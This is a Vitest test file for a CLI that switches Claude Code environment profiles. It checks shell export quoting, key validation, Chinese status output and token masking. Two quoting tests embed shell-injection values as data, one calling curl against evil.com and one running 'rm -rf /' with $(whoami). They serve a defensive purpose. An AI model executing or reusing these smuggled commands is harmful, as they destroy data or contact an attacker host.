import { describe, it, expect, beforeEach } from 'vitest';
import { envPresenter, buildExportCommands, buildSwitchCommands } from '../src/presenters/envPresenter.js';
import { AppError } from '../src/errors.js';
import type { EnvConfig, Profile } from '../src/types/index.js';

describe('EnvPresenter', () => {
  describe('formatBanner', () => {
    it('should return non-empty banner with Unicode box-drawing and Chinese title', () => {
      const banner = envPresenter.formatBanner();
      expect(banner.length).toBeGreaterThan(0);
      expect(banner).toContain('环境切换器');
      expect(banner).toContain('┌');
      expect(banner).toContain('┐');
    });
  });

  describe('buildExportCommands', () => {
    it('should generate export commands with single quotes', () => {
      const env: EnvConfig = {
        ANTHROPIC_BASE_URL: 'https://api.test.com',
        ANTHROPIC_AUTH_TOKEN: 'test-token',
        ANTHROPIC_MODEL: 'test-model',
        ANTHROPIC_DEFAULT_SONNET_MODEL: 'test-sonnet',
        ANTHROPIC_DEFAULT_OPUS_MODEL: 'test-opus',
        ANTHROPIC_DEFAULT_HAIKU_MODEL: 'test-haiku',
      };

      const result = buildExportCommands(env);

      expect(result).toBe(
        "export ANTHROPIC_BASE_URL='https://api.test.com';\nexport ANTHROPIC_AUTH_TOKEN='test-token';\nexport ANTHROPIC_MODEL='test-model';\nexport ANTHROPIC_DEFAULT_SONNET_MODEL='test-sonnet';\nexport ANTHROPIC_DEFAULT_OPUS_MODEL='test-opus';\nexport ANTHROPIC_DEFAULT_HAIKU_MODEL='test-haiku';"
      );
    });

    it('should skip empty values', () => {
      const env: EnvConfig = {
        ANTHROPIC_BASE_URL: 'https://api.test.com',
        ANTHROPIC_AUTH_TOKEN: '',
        ANTHROPIC_MODEL: 'test-model',
        ANTHROPIC_DEFAULT_SONNET_MODEL: 'test-sonnet',
        ANTHROPIC_DEFAULT_OPUS_MODEL: 'test-opus',
        ANTHROPIC_DEFAULT_HAIKU_MODEL: 'test-haiku',
      };

      const result = buildExportCommands(env);

      expect(result).not.toContain('ANTHROPIC_AUTH_TOKEN');
      expect(result).toContain("export ANTHROPIC_BASE_URL='https://api.test.com';");
    });

    it('should handle optional fields when present', () => {
      const env: EnvConfig = {
        ANTHROPIC_BASE_URL: 'https://api.test.com',
        ANTHROPIC_AUTH_TOKEN: 'token',
        ANTHROPIC_MODEL: 'model',
        ANTHROPIC_DEFAULT_SONNET_MODEL: 'sonnet',
        ANTHROPIC_DEFAULT_OPUS_MODEL: 'opus',
        ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku',
        API_TIMEOUT_MS: '5000',
        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1',
      };

      const result = buildExportCommands(env);

      expect(result).toContain("export API_TIMEOUT_MS='5000';");
      expect(result).toContain("export CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='1';");
    });

    it('should safely quote values containing single quotes', () => {
      const env: EnvConfig = {
        ANTHROPIC_AUTH_TOKEN: "'; curl http://evil.com; '",
      };

      const result = buildExportCommands(env);

      expect(result).toBe("export ANTHROPIC_AUTH_TOKEN=''\\''; curl http://evil.com; '\\''';");
    });

    it('should safely quote values containing backticks and $()', () => {
      const env: EnvConfig = {
        ANTHROPIC_AUTH_TOKEN: '`rm -rf /` $(whoami)',
      };

      const result = buildExportCommands(env);

      expect(result).toContain("export ANTHROPIC_AUTH_TOKEN='`rm -rf /` $(whoami)';");
    });

    it('should reject invalid env keys', () => {
      const env: EnvConfig = {
        'FOO-BAR': 'value',
      } as EnvConfig;

      expect(() => buildExportCommands(env)).toThrow();
      try {
        buildExportCommands(env);
      } catch (e: unknown) {
        expect(e).toBeInstanceOf(AppError);
        expect((e as AppError).code).toBe('INVALID_ENV_KEY');
      }
    });

    it('should reject env keys starting with digit', () => {
      const env: EnvConfig = {
        '1FOO': 'value',
      } as EnvConfig;

      expect(() => buildExportCommands(env)).toThrow();
      try {
        buildExportCommands(env);
      } catch (e: unknown) {
        expect(e).toBeInstanceOf(AppError);
        expect((e as AppError).code).toBe('INVALID_ENV_KEY');
      }
    });
  });

  describe('buildSwitchCommands', () => {
    const baseEnv: EnvConfig = {
      ANTHROPIC_BASE_URL: 'https://api.test.com',
      ANTHROPIC_AUTH_TOKEN: 'token',
      ANTHROPIC_MODEL: 'model',
      ANTHROPIC_DEFAULT_SONNET_MODEL: 'sonnet',
      ANTHROPIC_DEFAULT_OPUS_MODEL: 'opus',
      ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku',
    };

    it('should unset keys from old env not present in new env', () => {
      const oldEnv: EnvConfig = {
        ...baseEnv,
        API_TIMEOUT_MS: '3000000',
        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1',
      };
      const newEnv: EnvConfig = {
        ...baseEnv,
        ANTHROPIC_BASE_URL: 'https://api.new.com',
        CLAUDE_CODE_SUBAGENT_MODEL: 'kimi-k2.5',
      };

      const result = buildSwitchCommands(oldEnv, newEnv);

      expect(result).toContain('unset API_TIMEOUT_MS;');
      expect(result).toContain('unset CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC;');
      expect(result).toContain("export CLAUDE_CODE_SUBAGENT_MODEL='kimi-k2.5';");
      expect(result).not.toContain('unset CLAUDE_CODE_SUBAGENT_MODEL');
      // Verify ordering: unsets before exports
      const unsetIndex = result.indexOf('unset API_TIMEOUT_MS');
      const exportIndex = result.indexOf('export ANTHROPIC_BASE_URL');
      expect(unsetIndex).toBeLessThan(exportIndex);
    });

    it('should produce only export lines when oldEnv is null', () => {
      const newEnv: EnvConfig = { ...baseEnv };
      const result = buildSwitchCommands(null, newEnv);

      expect(result).not.toContain('unset');
      expect(result).toContain('export');
    });

    it('should skip unset for keys with falsy values in old env', () => {
      const oldEnv: EnvConfig = { ...baseEnv, API_TIMEOUT_MS: '' };
      const newEnv: EnvConfig = { ...baseEnv, ANTHROPIC_BASE_URL: 'https://api.new.com' };

      const result = buildSwitchCommands(oldEnv, newEnv);

      expect(result).not.toContain('unset API_TIMEOUT_MS');
    });

    it('should handle identical envs (no unsets)', () => {
      const env: EnvConfig = { ...baseEnv };
      const result = buildSwitchCommands(env, env);

      expect(result).not.toContain('unset');
      expect(result).toContain('export');
    });
  });

  describe('formatProfileList', () => {
    it('should show empty state when no profiles', () => {
      const result = envPresenter.formatProfileList([], null);

      expect(result).toContain('没有可用的配置');
      expect(result).toContain('claude-profile create');
    });

    it('should show current profile with active marker and 已激活 status', () => {
      const profiles: Profile[] = [{
        name: 'minimax',
        description: 'MiniMax',
        env: {
          ANTHROPIC_BASE_URL: 'https://api.test.com',
          ANTHROPIC_AUTH_TOKEN: 'token',
          ANTHROPIC_MODEL: 'model',
          ANTHROPIC_DEFAULT_SONNET_MODEL: 'sonnet',
          ANTHROPIC_DEFAULT_OPUS_MODEL: 'opus',
          ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku',
        },
      }];

      const result = envPresenter.formatProfileList(profiles, 'minimax');

      expect(result).toContain('●');
      expect(result).toContain('minimax');
      expect(result).toContain('已激活');
      expect(result).toContain('[ ***** ]');
    });

    it('should show inactive profile with standby marker and 待命 status', () => {
      const profiles: Profile[] = [{
        name: 'minimax',
        description: 'MiniMax',
        env: {
          ANTHROPIC_BASE_URL: 'https://api.test.com',
          ANTHROPIC_AUTH_TOKEN: 'token',
          ANTHROPIC_MODEL: 'model',
          ANTHROPIC_DEFAULT_SONNET_MODEL: 'sonnet',
          ANTHROPIC_DEFAULT_OPUS_MODEL: 'opus',
          ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku',
        },
      }];

      const result = envPresenter.formatProfileList(profiles, null);

      expect(result).toContain('○');
      expect(result).toContain('待命');
      expect(result).toContain('minimax');
    });

    it('should show profile details in table format', () => {
      const profiles: Profile[] = [{
        name: 'minimax',
        description: 'MiniMax API',
        env: {
          ANTHROPIC_BASE_URL: 'https://api.minimaxi.com',
          ANTHROPIC_AUTH_TOKEN: 'token',
          ANTHROPIC_MODEL: 'MiniMax-M2.7',
          ANTHROPIC_DEFAULT_SONNET_MODEL: 'MiniMax-M2.7',
          ANTHROPIC_DEFAULT_OPUS_MODEL: 'MiniMax-M2.7',
          ANTHROPIC_DEFAULT_HAIKU_MODEL: 'MiniMax-M2.7',
        },
      }];

      const result = envPresenter.formatProfileList(profiles, null);

      expect(result).toContain('minimax');
      expect(result).toContain('MiniMax API');
      expect(result).toContain('PROFILE');
      expect(result).toContain('PROVIDER');
      expect(result).toContain('STATUS');
      expect(result).toContain('API KEY');
    });
  });

  describe('formatSwitchSuccess', () => {
    it('should include switched to message with profile name', () => {
      const env: EnvConfig = {
        ANTHROPIC_BASE_URL: 'https://api.test.com',
        ANTHROPIC_AUTH_TOKEN: 'token',
        ANTHROPIC_MODEL: 'model',
        ANTHROPIC_DEFAULT_SONNET_MODEL: 'sonnet',
        ANTHROPIC_DEFAULT_OPUS_MODEL: 'opus',
        ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku',
      };

      const result = envPresenter.formatSwitchSuccess('test-profile', env);

      expect(result).toContain('❯');
      expect(result).toContain('已切换到');
      expect(result).toContain('test-profile');
      expect(result).toContain('环境变量已注入当前 shell');
    });
  });

  describe('formatDeleteSuccess', () => {
    it('should mention active profile warning when deleting current', () => {
      const result = envPresenter.formatDeleteSuccess('test-profile', true);

      expect(result).toContain('已删除');
      expect(result).toContain('当前激活');
    });

    it('should not mention active warning when deleting inactive', () => {
      const result = envPresenter.formatDeleteSuccess('test-profile', false);

      expect(result).toContain('已删除');
      expect(result).not.toContain('当前激活');
    });
  });

  describe('formatError', () => {
    it('should format error message with ANSI color', () => {
      const result = envPresenter.formatError('Something went wrong');

      expect(result).toContain('错误');
      expect(result).toContain('Something went wrong');
    });
  });

  describe('formatNoProfiles', () => {
    it('should show message to create profile', () => {
      const result = envPresenter.formatNoProfiles();

      expect(result).toContain('create');
    });
  });

  describe('formatCreateSuccess', () => {
    it('should include profile name in output', () => {
      const result = envPresenter.formatCreateSuccess('test-profile', '/path/to/test-profile.json');

      expect(result).toContain('test-profile');
      expect(result).toContain('已创建');
    });
  });

  // ── formatVerboseHeader (ADR-0005) ────────────────────────────────

  describe('formatVerboseHeader', () => {
    it('should render all four data fields in order', () => {
      const result = envPresenter.formatVerboseHeader({
        storeLocation: '/home/u/.config/claude-profile',
        currentProfile: 'minimax',
        profileCount: 3,
      });

      const lines = result.split('\n');
      expect(lines).toEqual([
        '详细信息:',
        '  配置目录: /home/u/.config/claude-profile',
        '  当前配置: minimax',
        '  配置数量: 3',
      ]);
    });

    it('should fall back to 未知 when storeLocation is null', () => {
      const result = envPresenter.formatVerboseHeader({
        storeLocation: null,
        currentProfile: 'minimax',
        profileCount: 1,
      });
      expect(result).toContain('配置目录: 未知');
    });

    it('should fall back to 无 when currentProfile is null', () => {
      const result = envPresenter.formatVerboseHeader({
        storeLocation: '/p',
        currentProfile: null,
        profileCount: 0,
      });
      expect(result).toContain('当前配置: 无');
    });

    it('should not add leading or trailing newline', () => {
      const result = envPresenter.formatVerboseHeader({
        storeLocation: '/p',
        currentProfile: 'x',
        profileCount: 1,
      });
      expect(result.startsWith('\n')).toBe(false);
      expect(result.endsWith('\n')).toBe(false);
    });
  });

  // ── formatValidationIssues (ADR-0005) ─────────────────────────────

  describe('formatValidationIssues', () => {
    it('should return empty string for empty issues', () => {
      expect(envPresenter.formatValidationIssues([])).toBe('');
    });

    it('should render errors with the ❌ header', () => {
      const result = envPresenter.formatValidationIssues([
        { profile: 'a', envKey: 'ANTHROPIC_BASE_URL', message: 'URL 不能为空', severity: 'error' },
      ]);
      expect(result).toContain('❌ 发现 1 个错误:');
      expect(result).toContain('  • [a] ANTHROPIC_BASE_URL: URL 不能为空');
    });

    it('should render warnings with the ⚠️ header', () => {
      const result = envPresenter.formatValidationIssues([
        { profile: 'b', envKey: 'ANTHROPIC_DEFAULT_HAIKU_MODEL', message: 'ANTHROPIC_DEFAULT_HAIKU_MODEL 未设置', severity: 'warning' },
      ]);
      expect(result).toContain('⚠️  发现 1 个警告:');
      expect(result).toContain('  • [b] ANTHROPIC_DEFAULT_HAIKU_MODEL: ANTHROPIC_DEFAULT_HAIKU_MODEL 未设置');
    });

    it('should split errors and warnings into two blocks, errors first', () => {
      const result = envPresenter.formatValidationIssues([
        { profile: 'p1', envKey: 'ANTHROPIC_BASE_URL', message: 'empty', severity: 'error' },
        { profile: 'p1', envKey: 'ANTHROPIC_AUTH_TOKEN', message: 'empty', severity: 'error' },
        { profile: 'p2', envKey: 'ANTHROPIC_DEFAULT_HAIKU_MODEL', message: 'unset', severity: 'warning' },
      ]);
      const errIdx = result.indexOf('❌');
      const warnIdx = result.indexOf('⚠️');
      expect(errIdx).toBeGreaterThanOrEqual(0);
      expect(warnIdx).toBeGreaterThan(errIdx);
      expect(result).toContain('❌ 发现 2 个错误:');
      expect(result).toContain('⚠️  发现 1 个警告:');
    });

    it('should render only the errors block when no warnings', () => {
      const result = envPresenter.formatValidationIssues([
        { profile: 'p', envKey: 'K', message: 'm', severity: 'error' },
      ]);
      expect(result).toContain('❌');
      expect(result).not.toContain('⚠️');
    });

    it('should render only the warnings block when no errors', () => {
      const result = envPresenter.formatValidationIssues([
        { profile: 'p', envKey: 'K', message: 'm', severity: 'warning' },
      ]);
      expect(result).toContain('⚠️');
      expect(result).not.toContain('❌');
    });
  });

  describe('formatStatus', () => {
    const noopMask = (_k: string, v: string | undefined) => v ?? '';

    it('renders the 4-section status block with all 3 context lines', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'work',
        storeLocation: '/home/u/.config/claude-profile',
        profileCount: 3,
        shellEnv: {},
        maskValue: noopMask,
      });
      expect(result).toContain('当前状态');
      expect(result).toContain('当前配置: work');
      expect(result).toContain('配置目录: /home/u/.config/claude-profile');
      expect(result).toContain('配置数量: 3');
    });

    it('renders "无" / "未知" for null currentProfile / storeLocation', () => {
      const result = envPresenter.formatStatus({
        currentProfile: null,
        storeLocation: null,
        profileCount: 0,
        shellEnv: {},
        maskValue: noopMask,
      });
      expect(result).toContain('当前配置: 无');
      expect(result).toContain('配置目录: 未知');
      expect(result).toContain('配置数量: 0');
    });

    it('renders the empty-state line when shellEnv is empty', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'p',
        storeLocation: '/d',
        profileCount: 1,
        shellEnv: {},
        maskValue: noopMask,
      });
      expect(result).toContain('Shell 环境变量 (注入来源):');
      expect(result).toContain('无 ANTHROPIC_* / CLAUDE_CODE_* 变量');
    });

    it('renders every shellEnv entry as KEY=value with leading indent', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'p',
        storeLocation: '/d',
        profileCount: 1,
        shellEnv: {
          ANTHROPIC_BASE_URL: 'https://api.test.com',
          ANTHROPIC_DEFAULT_HAIKU_MODEL: 'haiku-1',
        },
        maskValue: noopMask,
      });
      expect(result).toContain('    ANTHROPIC_BASE_URL=https://api.test.com');
      expect(result).toContain('    ANTHROPIC_DEFAULT_HAIKU_MODEL=haiku-1');
      // The header must come before the entries.
      expect(result.indexOf('Shell 环境变量')).toBeLessThan(
        result.indexOf('ANTHROPIC_BASE_URL=')
      );
    });

    it('applies maskValue to every shellEnv entry — sensitive keys never leak cleartext', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'p',
        storeLocation: '/d',
        profileCount: 1,
        shellEnv: {
          ANTHROPIC_AUTH_TOKEN: 'sk-supersecret',
          ANTHROPIC_BASE_URL: 'https://api.test.com',
        },
        // Mimic the real `maskValue`: token → '*****', non-sensitive → as-is.
        maskValue: (k, v) => (k === 'ANTHROPIC_AUTH_TOKEN' ? '*****' : v ?? ''),
      });
      expect(result).toContain('    ANTHROPIC_AUTH_TOKEN=*****');
      expect(result).not.toContain('sk-supersecret');
      // The non-sensitive key still renders normally.
      expect(result).toContain('    ANTHROPIC_BASE_URL=https://api.test.com');
    });

    it('renders "空" when maskValue returns an empty string', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'p',
        storeLocation: '/d',
        profileCount: 1,
        shellEnv: { ANTHROPIC_BASE_URL: 'something' },
        maskValue: () => '',
      });
      expect(result).toContain('ANTHROPIC_BASE_URL=空');
    });

    it('preserves the leading and trailing blank lines (drop-in for the command output)', () => {
      const result = envPresenter.formatStatus({
        currentProfile: 'p',
        storeLocation: '/d',
        profileCount: 1,
        shellEnv: {},
        maskValue: noopMask,
      });
      expect(result.startsWith('\n')).toBe(true);
      expect(result.endsWith('\n')).toBe(true);
    });
  });
});
